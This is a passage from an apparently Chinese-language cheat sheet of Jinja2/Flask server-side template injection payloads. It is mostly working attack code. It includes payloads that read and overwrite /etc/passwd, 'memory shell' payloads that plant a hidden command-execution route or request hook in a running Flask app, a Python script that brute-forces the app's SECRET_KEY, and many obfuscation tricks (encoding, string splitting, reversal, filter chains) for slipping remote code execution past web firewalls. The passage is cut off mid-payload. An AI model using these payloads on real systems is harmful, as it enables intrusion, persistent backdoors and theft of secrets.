&#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;；</span><br><span class="line">list()：将变量列成列表；</span><br><span class="line">string()：将变量转换成字符串；</span><br><span class="line">join()：将一个序列中的参数值拼接成字符串。示例看上面payload；</span><br><span class="line">abs()：返回一个数值的绝对值；</span><br><span class="line">first()：返回一个序列的第一个元素；</span><br><span class="line">last()：返回一个序列的最后一个元素；</span><br><span class="line">format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="line">length()：返回一个序列或者字典的长度；</span><br><span class="line">sum()：返回列表内数值的和；</span><br><span class="line">sort()：返回排序后的列表；</span><br><span class="line">default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。</span><br><span class="line">length()：返回字符串的长度，别名是count。</span><br></pre></td></tr></table></figure>

<p>python2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read()</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()</span><br></pre></td></tr></table></figure>

<p>python3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()</span><br></pre></td></tr></table></figure>

<h4 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h4><p>python2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;,&#x27;w&#x27;).write(&#x27;test&#x27;)&#125;&#125;</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;,&#x27;w&#x27;).write(&#x27;test&#x27;)</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;,&#x27;w&#x27;).write(&#x27;test&#x27;)</span><br></pre></td></tr></table></figure>

<h4 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h4><p>add_url_rule<br>提供了一个执行命令的路由</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>before_request_funcs</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda+:__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>after_request_funcs</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>error_handler_spec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&quot;exec&quot;](&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>通过回显内容的真假爆破字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;%for char in get_env(name=&quot;SECRET_KEY&quot;)%&#125;</span><br><span class="line">&#123;%if char is matching(&#x27;&#x27;) %&#125;1</span><br><span class="line">&#123;%else%&#125;0</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>

<p>示例脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://ip:port/&quot;</span></span><br><span class="line">s = string.printable</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssti</span>(<span class="params">re</span>):</span><br><span class="line">    payload = <span class="string">&quot;&quot;&quot;text=&#123;%for char in get_env(name=&quot;SECRET_KEY&quot;)%&#125;&#123;%if char is matching(&#x27;str&#x27;) %&#125;1&#123;%else%&#125;0&#123;%endif%&#125;&#123;%endfor%&#125;&quot;&quot;&quot;</span>.replace(<span class="string">&quot;str&quot;</span>, re)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = requests.post(url, data=payload, headers=headers, verify=<span class="literal">False</span>).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;1&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="built_in">print</span>(re, result)</span><br><span class="line">        <span class="keyword">return</span> re</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">	ssti(i)</span><br></pre></td></tr></table></figure>

<h4 id="jinja2过滤器"><a href="#jinja2过滤器" class="headerlink" title="jinja2过滤器"></a>jinja2过滤器</h4><p>attr<br>用于获取变量属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;|attr(&#x27;__class__&#x27;)</span><br><span class="line">&gt;&gt; &#x27;&#x27;.__class__</span><br></pre></td></tr></table></figure>

<p>format</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)==&#x27;__class__&#x27;</span><br></pre></td></tr></table></figure>

<p>first last random</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|last() =&gt; [-1]</span><br><span class="line">|first() =&gt; [0]</span><br><span class="line">|random() =&gt; [?]</span><br></pre></td></tr></table></figure>

<p>join</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[1,2,3]|join(&#x27;|&#x27;)&#125;&#125;</span><br><span class="line">&gt;&gt; 1|2|3</span><br><span class="line">&#123;&#123;[1,2,3]|join&#125;&#125;</span><br><span class="line">&gt;&gt; 123</span><br></pre></td></tr></table></figure>

<p>lower</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;[&quot;__CLASS__&quot;|lower]</span><br></pre></td></tr></table></figure>

<p>replace reverse</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;__claee__&#x27;|replace(&#x27;ee&#x27;,&#x27;ss&#x27;)</span><br><span class="line">&#x27;__ssalc__&#x27;|reverse</span><br></pre></td></tr></table></figure>

<p>string</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__ =&gt; &lt;class &#x27;tuple&#x27;&gt;</span><br><span class="line">(().__class__|string)[0] =&gt; &lt;</span><br></pre></td></tr></table></figure>

<p>select</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">()|select|string</span><br><span class="line">&gt;&gt; &#x27;&lt;generator object select_or_reject at 0x0000022717FF33C0&gt;&#x27;</span><br></pre></td></tr></table></figure>

<p>list<br>转换为列表</p>
<h4 id="过滤关键词"><a href="#过滤关键词" class="headerlink" title="过滤关键词"></a>过滤关键词</h4><p>字符串拼接<br>加号是多余的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__buil&#x27;+&#x27;tins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).popen(&#x27;who&#x27;+&#x27;ami&#x27;).read()&#125;&#125;</span><br><span class="line">yyy.__init__.__globals__.__builtins__|attr(&#x27;__getit&#x27;&#x27;em__&#x27;)(&#x27;ev&#x27;&#x27;al&#x27;)(&#x27;__imp&#x27;&#x27;ort__(&quot;o&#x27;&#x27;s&quot;).po&#x27;&#x27;pen(&quot;ls /&quot;).re&#x27;&#x27;ad()&#x27;)</span><br><span class="line">[].__getattribute__(&#x27;__c&#x27;+&#x27;lass__&#x27;).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__[&quot;op&quot;+&quot;en&quot;](&quot;/fl&quot;+&quot;ag&quot;).read()</span><br><span class="line">&#123;%print config|attr(&#x27;%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,99,108,97,115,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c&#x27;|format(95,95,105,110,105,116,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,108,111,98,97,108,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(&#x27;o&#x27;+&#x27;s&#x27;)|attr(&#x27;%c%c%c%c%c&#x27;|format(112,111,112,101,110))(&#x27;ls&#x27;)|attr(&#x27;%c%c%c%c&#x27;|format(114,101,97,100))()%&#125;</span><br><span class="line">&#123;%print(((lipsum[(session|string)[35:46]])[(session|string)[53:55]])[(session|string)[73:78]]((session|string)[85:139]))%&#125;</span><br></pre></td></tr></table></figure>

<p>反转</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler[&#x27;__tini__&#x27;[::-1]][&#x27;__slabolg__&#x27;[::-1]].os.popen(&#x27;id&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>lower()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;sss.__init__.__globals__.__builtins__.open(&quot;/FLAG&quot;.lower()).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>清空关键字list</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[关键字list变量名].clear()</span><br></pre></td></tr></table></figure>

<p>引号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;].__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__bui&#x27;&#x27;ltins__&#x27;][&#x27;__impo&#x27;&#x27;rt__&#x27;](&#x27;o&#x27;&#x27;s&#x27;).popen(&#x27;who&#x27;&#x27;ami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>__getattribute__同时绕过中括号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__getattribute__(&#x27;__class__&#x27;)</span><br></pre></td></tr></table></figure>

<p>切片</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;__ssalc__&quot;[::-1]</span><br></pre></td></tr></table></figure>

<p>编码<br>base64（python2）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;X19pbXBvcnRfXw==&#x27;.decode(&#x27;base64&#x27;)](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;[].__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;)).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>Unicode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>16进制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>8进制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;\137\137\143\154\141\163\163\137\137&#x27;].__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;\137\137\151\155\160\157\162\164\137\137&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>format</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)</span><br></pre></td></tr></table></figure>

<p>chr</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=url_for.__globals__[&#x27;__builtins__&#x27;].chr %&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>~</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set a=&#x27;__cla&#x27; %&#125;&#123;%set b=&#x27;ss__&#x27;%&#125;&#123;&#123;&quot;&quot;[a~b]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>大小写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;[&#x27;__CLASS__&#x27;.lower()]</span><br></pre></td></tr></table></figure>

<p>unicode字符 &#x2F; Non-ASCII Identifies</p>
<p>𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳<br>𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫<br>０１２３４５６７８９</p>
<p>attr与过滤器<br>如果没有过滤globals，从globals里把eval函数找出来，然后构造任意字符串放进去RCE即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set xhx = ((&#123; &#125;|select()|string()|list()).pop(24)|string())%&#125;  # _</span><br><span class="line">&#123;% set spa = ((app.__doc__|list()).pop(102)|string())%&#125;  #空格</span><br><span class="line">&#123;% set pt = ((app.__doc__|list()).pop(320)|string())%&#125;  #点</span><br><span class="line">&#123;% set yin = ((app.__doc__|list()).pop(337)|string())%&#125;   #单引号</span><br><span class="line">&#123;% set left = ((app.__doc__|list()).pop(264)|string())%&#125;   #左括号(</span><br><span class="line">&#123;% set right = ((app.__doc__|list()).pop(286)|string())%&#125;   #右括号)</span><br><span class="line">&#123;% set slas = (y1ng.__init__.__globals__.__repr__()|list()).pop(349)%&#125;   #斜线/</span><br><span class="line">&#123;% set bu = dict(buil=aa,tins=dd)|join() %&#125;  #builtins</span><br><span class="line">&#123;% set im = dict(imp=aa,ort=dd)|join() %&#125;  #import</span><br><span class="line">&#123;% set sy = dict(po=aa,pen=dd)|join() %&#125;  #popen</span><br><span class="line">&#123;% set os = dict(o=aa,s=dd)|join() %&#125;  #os</span><br><span class="line">&#123;% set ca = dict(ca=aa,t=dd)|join() %&#125;  #cat</span><br><span class="line">&#123;% set flg = dict(fl=aa,ag=dd)|join() %&#125;  #flag</span><br><span class="line">&#123;% set ev = dict(ev=aa,al=dd)|join() %&#125; #eval</span><br><span class="line">&#123;% set red = dict(re=aa,ad=dd)|join()%&#125;  #read</span><br><span class="line">&#123;% set bul = xhx*2~bu~xhx*2 %&#125;  #__builtins__</span><br><span class="line"></span><br><span class="line">#拼接起来 __import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br><span class="line">&#123;% set pld = xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right %&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% for f,v in y1ng.__init__.__globals__.items() %&#125; #globals</span><br><span class="line">	&#123;% if f == bul %&#125; </span><br><span class="line">		&#123;% for a,b in v.items() %&#125;  #builtins</span><br><span class="line">			&#123;% if a == ev %&#125; #eval</span><br><span class="line">				&#123;&#123;b(pld)&#125;&#125; #eval(pld)</span><br><span class="line">			&#123;% endif %&#125;</span><br><span class="line">		&#123;% endfor %&#125;</span><br><span class="line">	&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">#payload</span><br><span class="line">#&#123;%%20set%20xhx%20=%20((&#123;%20&#125;|select()|string()|list()).pop(24)|string())%&#125;&#123;%%20set%20spa%20=%20((app.__doc__|list()).pop(102)|string())%&#125;&#123;%%20set%20pt%20=%20((app.__doc__|list()).pop(320)|string())%&#125;%20&#123;%%20set%20yin%20=%20((app.__doc__|list()).pop(337)|string())%&#125;&#123;%%20set%20left%20=%20((app.__doc__|list()).pop(264)|string())%&#125;%20&#123;%%20set%20right%20=%20((app.__doc__|list()).pop(286)|string())%&#125;%20&#123;%%20set%20slas%20=%20(y1ng.__init__.__globals__.__repr__()|list()).pop(349)%&#125;%20&#123;%%20set%20bu%20=%20dict(buil=aa,tins=dd)|join()%20%&#125;&#123;%%20set%20im%20=%20dict(imp=aa,ort=dd)|join()%20%&#125;&#123;%%20set%20sy%20=%20dict(po=aa,pen=dd)|join()%20%&#125;&#123;%%20set%20os%20=%20dict(o=aa,s=dd)|join()%20%&#125;%20&#123;%%20set%20ca%20=%20dict(ca=aa,t=dd)|join()%20%&#125;&#123;%%20set%20flg%20=%20dict(fl=aa,ag=dd)|join()%20%&#125;&#123;%%20set%20ev%20=%20dict(ev=aa,al=dd)|join()%20%&#125;%20&#123;%%20set%20red%20=%20dict(re=aa,ad=dd)|join()%&#125;&#123;%%20set%20bul%20=%20xhx*2~bu~xhx*2%20%&#125;&#123;%%20set%20pld%20=%20xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right%20%&#125;%20&#123;%%20for%20f,v%20in%20y1ng.__init__.__globals__.items()%20%&#125;&#123;%%20if%20f%20==%20bul%20%&#125;&#123;%%20for%20a,b%20in%20v.items()%20%&#125;&#123;%%20if%20a%20==%20ev%20%&#125;&#123;&#123;b(pld)&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set a=dict(po=x,p=x)|join%&#125;  #pop</span><br><span class="line">&#123;%set b=(()|select|string|list)|attr(a)(𝟐𝟒)%&#125;  #_</span><br><span class="line">&#123;%set c=(b,b,dict(do=x,c=x)|join,b,b)|join()%&#125;  #__doc__</span><br><span class="line">&#123;%set d=(x|attr(c)|list)|attr(a)(𝟑𝟑𝟕)%&#125;  #单引号</span><br><span class="line">&#123;%set e=(x|attr(c)|list)|attr(a)(𝟐𝟔𝟒)%&#125;  #左括号(</span><br><span class="line">&#123;%set f=(x|attr(c)|list)|attr(a)(𝟐𝟖𝟔)%&#125;  #右括号)</span><br><span class="line">&#123;%set g=(x|attr(c)|list)|attr(a)(𝟑𝟐𝟎)%&#125;  #点.</span><br><span class="line">&#123;%set h=(x|attr(c)|list)|attr(a)(𝟏𝟎𝟐)%&#125;  #空格</span><br><span class="line">&#123;%set i=(b,b,dict(in=x,it=x)|join,b,b)|join()%&#125;  #__init__</span><br><span class="line">&#123;%set j=(b,b,dict(glo=x,bals=x)|join,b,b)|join()%&#125;  #__globals__</span><br><span class="line">&#123;%set k=(b,b,dict(ge=x,titem=x)|join,b,b)|join()%&#125;  #__getitem__</span><br><span class="line">&#123;%set l=(b,b,dict(buil=x,tins=x)|join,b,b)|join()%&#125;  #__builtins__</span><br><span class="line">&#123;%set m=(b,b,dict(im=x,port=x)|join,b,b)|join()%&#125;  #__import__</span><br><span class="line">&#123;%set n=(x|attr(i)|attr(j)|string|list)|attr(a)(𝟑𝟒𝟗)%&#125;</span><br><span class="line">&#123;%set o=dict(ev=x,al=x)|join()%&#125;  #eval</span><br><span class="line">&#123;%set p=dict(o=x,s=x)|join()%&#125;  #os</span><br><span class="line">&#123;%set q=dict(po=x,pen=x)|join()%&#125;  #popen</span><br><span class="line">&#123;%set r=dict(re=x,ad=x)|join()%&#125;  #read</span><br><span class="line">&#123;%set s=(dict(ls=x)|join,h,n,dict(var=x)|join,n,dict(www=x)|join,n,dict(flask=x)|join)|join()%&#125;</span><br><span class="line">&#123;%set t=(m,e,d,p,d,f,g,q,e,d,s,d,f,g,r,e,f)|join()%&#125;</span><br><span class="line">&#123;%set u=x|attr(i)|attr(j)|attr(k)(l)|attr(k)(o)(t)%&#125;</span><br><span class="line">&#123;&#123;u&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set id=dict(ind=a,ex=a)|join%&#125;</span><br><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ls=dict(ls=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set nn=dict(n=a)|join%&#125;</span><br><span class="line">&#123;% set tt=dict(t=a)|join%&#125;</span><br><span class="line">&#123;% set ff=dict(f=a)|join%&#125;</span><br><span class="line">&#123;% set ooqq=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;</span><br><span class="line">&#123;% set three=(lipsum|string|list)|attr(id)(nn) 